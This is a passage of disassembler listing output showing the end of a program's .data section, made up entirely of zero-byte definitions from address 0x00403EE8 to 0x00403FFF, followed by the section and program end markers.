.data:00403EE8                 db    0
.data:00403EE9                 db    0
.data:00403EEA                 db    0
.data:00403EEB                 db    0
.data:00403EEC                 db    0
.data:00403EED                 db    0
.data:00403EEE                 db    0
.data:00403EEF                 db    0
.data:00403EF0                 db    0
.data:00403EF1                 db    0
.data:00403EF2                 db    0
.data:00403EF3                 db    0
.data:00403EF4                 db    0
.data:00403EF5                 db    0
.data:00403EF6                 db    0
.data:00403EF7                 db    0
.data:00403EF8                 db    0
.data:00403EF9                 db    0
.data:00403EFA                 db    0
.data:00403EFB                 db    0
.data:00403EFC                 db    0
.data:00403EFD                 db    0
.data:00403EFE                 db    0
.data:00403EFF                 db    0
.data:00403F00                 db    0
.data:00403F01                 db    0
.data:00403F02                 db    0
.data:00403F03                 db    0
.data:00403F04                 db    0
.data:00403F05                 db    0
.data:00403F06                 db    0
.data:00403F07                 db    0
.data:00403F08                 db    0
.data:00403F09                 db    0
.data:00403F0A                 db    0
.data:00403F0B                 db    0
.data:00403F0C                 db    0
.data:00403F0D                 db    0
.data:00403F0E                 db    0
.data:00403F0F                 db    0
.data:00403F10                 db    0
.data:00403F11                 db    0
.data:00403F12                 db    0
.data:00403F13                 db    0
.data:00403F14                 db    0
.data:00403F15                 db    0
.data:00403F16                 db    0
.data:00403F17                 db    0
.data:00403F18                 db    0
.data:00403F19                 db    0
.data:00403F1A                 db    0
.data:00403F1B                 db    0
.data:00403F1C                 db    0
.data:00403F1D                 db    0
.data:00403F1E                 db    0
.data:00403F1F                 db    0
.data:00403F20                 db    0
.data:00403F21                 db    0
.data:00403F22                 db    0
.data:00403F23                 db    0
.data:00403F24                 db    0
.data:00403F25                 db    0
.data:00403F26                 db    0
.data:00403F27                 db    0
.data:00403F28                 db    0
.data:00403F29                 db    0
.data:00403F2A                 db    0
.data:00403F2B                 db    0
.data:00403F2C                 db    0
.data:00403F2D                 db    0
.data:00403F2E                 db    0
.data:00403F2F                 db    0
.data:00403F30                 db    0
.data:00403F31                 db    0
.data:00403F32                 db    0
.data:00403F33                 db    0
.data:00403F34                 db    0
.data:00403F35                 db    0
.data:00403F36                 db    0
.data:00403F37                 db    0
.data:00403F38                 db    0
.data:00403F39                 db    0
.data:00403F3A                 db    0
.data:00403F3B                 db    0
.data:00403F3C                 db    0
.data:00403F3D                 db    0
.data:00403F3E                 db    0
.data:00403F3F                 db    0
.data:00403F40                 db    0
.data:00403F41                 db    0
.data:00403F42                 db    0
.data:00403F43                 db    0
.data:00403F44                 db    0
.data:00403F45                 db    0
.data:00403F46                 db    0
.data:00403F47                 db    0
.data:00403F48                 db    0
.data:00403F49                 db    0
.data:00403F4A                 db    0
.data:00403F4B                 db    0
.data:00403F4C                 db    0
.data:00403F4D                 db    0
.data:00403F4E                 db    0
.data:00403F4F                 db    0
.data:00403F50                 db    0
.data:00403F51                 db    0
.data:00403F52                 db    0
.data:00403F53                 db    0
.data:00403F54                 db    0
.data:00403F55                 db    0
.data:00403F56                 db    0
.data:00403F57                 db    0
.data:00403F58                 db    0
.data:00403F59                 db    0
.data:00403F5A                 db    0
.data:00403F5B                 db    0
.data:00403F5C                 db    0
.data:00403F5D                 db    0
.data:00403F5E                 db    0
.data:00403F5F                 db    0
.data:00403F60                 db    0
.data:00403F61                 db    0
.data:00403F62                 db    0
.data:00403F63                 db    0
.data:00403F64                 db    0
.data:00403F65                 db    0
.data:00403F66                 db    0
.data:00403F67                 db    0
.data:00403F68                 db    0
.data:00403F69                 db    0
.data:00403F6A                 db    0
.data:00403F6B                 db    0
.data:00403F6C                 db    0
.data:00403F6D                 db    0
.data:00403F6E                 db    0
.data:00403F6F                 db    0
.data:00403F70                 db    0
.data:00403F71                 db    0
.data:00403F72                 db    0
.data:00403F73                 db    0
.data:00403F74                 db    0
.data:00403F75                 db    0
.data:00403F76                 db    0
.data:00403F77                 db    0
.data:00403F78                 db    0
.data:00403F79                 db    0
.data:00403F7A                 db    0
.data:00403F7B                 db    0
.data:00403F7C                 db    0
.data:00403F7D                 db    0
.data:00403F7E                 db    0
.data:00403F7F                 db    0
.data:00403F80                 db    0
.data:00403F81                 db    0
.data:00403F82                 db    0
.data:00403F83                 db    0
.data:00403F84                 db    0
.data:00403F85                 db    0
.data:00403F86                 db    0
.data:00403F87                 db    0
.data:00403F88                 db    0
.data:00403F89                 db    0
.data:00403F8A                 db    0
.data:00403F8B                 db    0
.data:00403F8C                 db    0
.data:00403F8D                 db    0
.data:00403F8E                 db    0
.data:00403F8F                 db    0
.data:00403F90                 db    0
.data:00403F91                 db    0
.data:00403F92                 db    0
.data:00403F93                 db    0
.data:00403F94                 db    0
.data:00403F95                 db    0
.data:00403F96                 db    0
.data:00403F97                 db    0
.data:00403F98                 db    0
.data:00403F99                 db    0
.data:00403F9A                 db    0
.data:00403F9B                 db    0
.data:00403F9C                 db    0
.data:00403F9D                 db    0
.data:00403F9E                 db    0
.data:00403F9F                 db    0
.data:00403FA0                 db    0
.data:00403FA1                 db    0
.data:00403FA2                 db    0
.data:00403FA3                 db    0
.data:00403FA4                 db    0
.data:00403FA5                 db    0
.data:00403FA6                 db    0
.data:00403FA7                 db    0
.data:00403FA8                 db    0
.data:00403FA9                 db    0
.data:00403FAA                 db    0
.data:00403FAB                 db    0
.data:00403FAC                 db    0
.data:00403FAD                 db    0
.data:00403FAE                 db    0
.data:00403FAF                 db    0
.data:00403FB0                 db    0
.data:00403FB1                 db    0
.data:00403FB2                 db    0
.data:00403FB3                 db    0
.data:00403FB4                 db    0
.data:00403FB5                 db    0
.data:00403FB6                 db    0
.data:00403FB7                 db    0
.data:00403FB8                 db    0
.data:00403FB9                 db    0
.data:00403FBA                 db    0
.data:00403FBB                 db    0
.data:00403FBC                 db    0
.data:00403FBD                 db    0
.data:00403FBE                 db    0
.data:00403FBF                 db    0
.data:00403FC0                 db    0
.data:00403FC1                 db    0
.data:00403FC2                 db    0
.data:00403FC3                 db    0
.data:00403FC4                 db    0
.data:00403FC5                 db    0
.data:00403FC6                 db    0
.data:00403FC7                 db    0
.data:00403FC8                 db    0
.data:00403FC9                 db    0
.data:00403FCA                 db    0
.data:00403FCB                 db    0
.data:00403FCC                 db    0
.data:00403FCD                 db    0
.data:00403FCE                 db    0
.data:00403FCF                 db    0
.data:00403FD0                 db    0
.data:00403FD1                 db    0
.data:00403FD2                 db    0
.data:00403FD3                 db    0
.data:00403FD4                 db    0
.data:00403FD5                 db    0
.data:00403FD6                 db    0
.data:00403FD7                 db    0
.data:00403FD8                 db    0
.data:00403FD9                 db    0
.data:00403FDA                 db    0
.data:00403FDB                 db    0
.data:00403FDC                 db    0
.data:00403FDD                 db    0
.data:00403FDE                 db    0
.data:00403FDF                 db    0
.data:00403FE0                 db    0
.data:00403FE1                 db    0
.data:00403FE2                 db    0
.data:00403FE3                 db    0
.data:00403FE4                 db    0
.data:00403FE5                 db    0
.data:00403FE6                 db    0
.data:00403FE7                 db    0
.data:00403FE8                 db    0
.data:00403FE9                 db    0
.data:00403FEA                 db    0
.data:00403FEB                 db    0
.data:00403FEC                 db    0
.data:00403FED                 db    0
.data:00403FEE                 db    0
.data:00403FEF                 db    0
.data:00403FF0                 db    0
.data:00403FF1                 db    0
.data:00403FF2                 db    0
.data:00403FF3                 db    0
.data:00403FF4                 db    0
.data:00403FF5                 db    0
.data:00403FF6                 db    0
.data:00403FF7                 db    0
.data:00403FF8                 db    0
.data:00403FF9                 db    0
.data:00403FFA                 db    0
.data:00403FFB                 db    0
.data:00403FFC                 db    0
.data:00403FFD                 db    0
.data:00403FFE                 db    0
.data:00403FFF                 db    0
.data:00403FFF _data           ends
.data:00403FFF
.data:00403FFF
.data:00403FFF                 end start
